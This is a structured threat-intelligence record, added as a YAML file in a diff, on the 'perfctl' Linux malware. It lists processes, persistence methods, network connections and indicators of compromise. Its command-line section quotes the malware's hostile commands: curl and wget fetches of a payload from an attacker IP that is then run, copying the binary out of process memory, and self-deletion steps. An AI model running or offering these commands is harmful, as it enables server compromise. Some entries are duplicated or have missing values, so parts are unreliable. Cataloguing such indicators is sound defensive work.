@@ -1,0 +1,148 @@
+description: Aqua Nautilus researchers have identified a persistent Linux malware
+  dubbed "perfctl" that actively seeks over 20,000 misconfigurations in servers worldwide.
+  The malware utilizes rootkits for stealth, stops activity during user login, employs
+  Unix sockets and TOR for communication, deletes its binary after execution, copies
+  itself from memory, establishes a backdoor, attempts privilege escalation via CVE-2021-4034,
+  and primarily deploys cryptominers or proxy-jacking software.
+attribution: Unknown (attributed to actors targeting Linux servers globally)
+malware_families:
+- perfctl
+- Wizlmsh
+- Perfctl
+- libgcwrap.so
+- AvatarPHP
+TTPs:
+  processes:
+  - sh
+  - httpd
+  - ldd
+  - top
+  - lsof
+  - crontab
+  - wizlmsh
+  - wizimsh
+  - bash
+  - curl
+  - wget
+  - sleep
+  - rm
+  - killall
+  - ps
+  - awk
+  - pkill
+  commandline:
+  - sh -c /tmp/httpd
+  - /usr/bin/ldd --version
+  - /usr/bin/top -bn1
+  - /usr/bin/lsof -i -P -n | grep LISTEN
+  - /usr/sbin/crontab -l
+  - wizlmsh -c /tmp/.xdiag/int/.per.s
+  - /bin/sh -c cp /proc/162/exe /tmp/.perf.c/sh & chmod +x /tmp/.perf.c/sh
+  - top -b -n 1 > /tmp/.xdiag/int/.per.s
+  - ldd -f /usr/bin/wizimsh > /tmp/.xdiag/int/.per.s
+  - /usr/bin/crontab -l > /tmp/.xdiag/int/.per.s
+  - lsof -w > /tmp/.xdiag/int/.per.s
+  - /bin/sh -c sleep 300; rm -rf /tmp/.install.pid33 &
+  - curl -A "curl/7.74.9" -s -o /tmp/httpd http://46.101.139.173/main/dist/avatar.php
+  - wget -U "curl/7.74.9" -q -O /tmp/httpd http://46.101.139.173/main/dist/avatar.php
+  - /tmp/httpd
+  - __curl http://46.101.139.173/main/dist/avatar.php > /tmp/httpd
+  - chmod +x /tmp/httpd
+  - 'PATH=/tmp: $PATH'
+  - KRI=kr httpd >/dev/null 2>&1 &
+  - sleep 5
+  - rm -rf /tmp/.install.pid33
+  - nohup bash -c "sleep 300; rm ~rf /tmp/.install.pidx" &
+  - rm -rf /tmp/.perf.c/* &/dev/null
+  - rm -rf /tmp/httpd
+  - /bin/bash
+  - /proc/162/exe /tmp/.perf.c/sh
+  - /lib/libpprocps.so
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  image_load: ''
+  network_connections:
+  - executable: sh
+    destination_address: 80.67.172.162
+    port: ''
+  - executable: sh
+    destination_address: 176.10.107.180
+    port: ''
+  - executable: sh
+    destination_address: 78.47.18.110
+    port: ''
+  - executable: sh
+    destination_address: 95.217.109.36
+    port: ''
+  - executable: sh
+    destination_address: 145.239.41.102
+    port: ''
+  - executable: curl
+    destination_address: 46.101.139.173
+    port: '80'
+    url: http://46.101.139.173/main/dist/avatar.php
+  - executable: wget
+    destination_address: 46.101.139.173
+    port: '80'
+    url: http://46.101.139.173/main/dist/avatar.php
+  - curl: null
+    destination: 46.101.139.173
+    port: '80'
+    url: http://46.101.139.173/main/dist/avatar.php
+  - wget: null
+    destination: 46.101.139.173
+    port: '80'
+    url: http://46.101.139.173/main/dist/avatar.php
+  file_modifications:
+  - /tmp/.apid
+  - /tmp/.xdiag/int/.per.s
+  - /root/.config/cron/perfcc
+  - /usr/bin/perfcc
+  - /usr/lib/libfsnkdev.so
+  - /tmp/httpd
+  - /tmp/.perf.c/sh
+  - /tmp/.xdiag/vei
+  - /tmp/.xdiag/vei.1
+  - /tmp/.install.pid33
+  - /lib/libpprocps.so
+  persistence:
+  - ~/.profile script modification to execute malware on user login
+  - ~/.bashrc file execution for user-specific configurations
+  - Creation of directories under /tmp
+  - Cron jobs (/root/.config/cron/perfcc)
+  - Copying itself to /usr/bin/perfcc and /usr/lib/libpprocps.so
+  - Unix socket communication via /tmp/.xdiag/int/.per.s
+  - Creates a background process with sleep 300 and removes /tmp/.install.pidx.
+  pipes:
+  - /tmp/.xdiag/int/.per.s
+  process_relations: The main payload (httpd) copies itself from memory to /tmp, renames
+    itself to the process that executed it (e.g., sh), and terminates the original
+    httpd binary.
+IOCs:
+- MD5(httpd): 656e22c65bf7c04d87b5afbe52b8d800
+- IP Address: 46.101.139.173
+- IP Address: 104.183.100.189
+- IP Address: 198.211.126.180
+- CVE: CVE-2021-4034
+- hash: MD5 of AM_binary
+- ip_address: 46.101.139.173
+- url: http://46.101.139.173/main/dist/avatar.php
+- file_path: /tmp/.perf.c/sh
+- file_path: /root/.config/cron/perfcc
+- file_path: /usr/bin/perfcc
+- file_path: /usr/lib/libfsnkdev.so
+- file_path: /tmp/.xdiag/int/.per.s
+- 46.101.139.173
+- /tmp/httpd
+- /tmp/.xdiag/vei
+- /tmp/.xdiag/vei.1
+- /tmp/.install.pid33
+- /tmp/.perf.c/sh
+- /lib/libpprocps.so
+authors:
+- Assaf Morag
+- Idan Revivo
+reference: https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/
+date_of_publication: October 03, 2024
+file_creation_date: May 14, 2025
